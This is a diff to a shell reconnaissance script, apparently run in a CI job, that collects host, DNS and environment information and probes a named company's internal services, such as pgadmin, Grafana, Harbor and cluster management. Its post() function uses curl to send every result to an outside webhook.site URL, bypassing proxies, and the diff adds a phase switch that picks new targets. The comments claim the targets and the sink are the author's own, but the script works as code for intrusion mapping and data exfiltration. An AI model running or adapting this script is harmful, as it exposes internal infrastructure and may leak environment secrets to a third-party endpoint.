@@ -3,8 +3,9 @@
 # Collects internal DNS/service vantage and probes Fireworks-owned hosts that resolve.
 # All targets are fireworks.ai / fireworks-ai.cloud / RFC1918(10.247.189.245). Sink = our own webhook.site token.
 T="https://webhook.site/fa65cc08-cf4f-424b-8163-1c46187a6bb9/i79712"
+PHASE=$(cat ci/recon.phase 2>/dev/null | tr -dc '0-9'); PH="p${PHASE:-1}"
 D=/tmp/i79712; mkdir -p "$D" 2>/dev/null
-post() { [ -s "$2" ] || { echo "empty $1" > "$D/$1"; set -- "$1" "$D/$1"; }; curl -s -o /dev/null --max-time 12 --noproxy '*' -X POST --data-binary @"$2" "$T/$1" 2>/dev/null; }
+post() { [ -s "$2" ] || { echo "empty $1" > "$D/$1"; set -- "$1" "$D/$1"; }; curl -s -o /dev/null --max-time 12 --noproxy '*' -X POST --data-binary @"$2" "$T/$PH/$1" 2>/dev/null; }
 
 # ---------- 1) host / dns / env ----------
 {
@@ -70,12 +71,18 @@ probe() { # name url [extra]
 }
 res() { timeout 2 getent ahostsv4 "$1" 2>/dev/null | grep -qE 'STREAM|DGRAM|INET'; }
 
+if [ "$PHASE" = "2" ]; then
+  echo "### PHASE2"
+  res company-dashboard.fireworks-ai.cloud && probe companydash "https://company-dashboard.fireworks-ai.cloud/"
+  res grafana.fireworks-ai.cloud && probe grafana "https://grafana.fireworks-ai.cloud/api/health"
+else
 res harbor.us-iowa-1.fireworks-ai.cloud && probe harbor "http://harbor.us-iowa-1.fireworks-ai.cloud/v2/"
 res metis.fireworks-ai.cloud && probe metis "https://metis.fireworks-ai.cloud/api/v1/auth/configuration"
 res langfuse.fireworks-ai.cloud && probe langfuse "https://langfuse.fireworks-ai.cloud/api/public/health"
 res pilot-dev.fireworks-ai.cloud && probe pilotdev "https://pilot-dev.fireworks-ai.cloud/"
 res pgadmin.fireworks-ai.cloud && probe pgadmin "https://pgadmin.fireworks-ai.cloud/"
 res cluster-management.fireworks-ai.cloud && probe clustermgmt "https://cluster-management.fireworks-ai.cloud/"
+fi
 
 # ---------- 5) done marker ----------
 { echo "### DONE"; date -u; echo "probes=$N"; } > "$D/done.txt" 2>&1
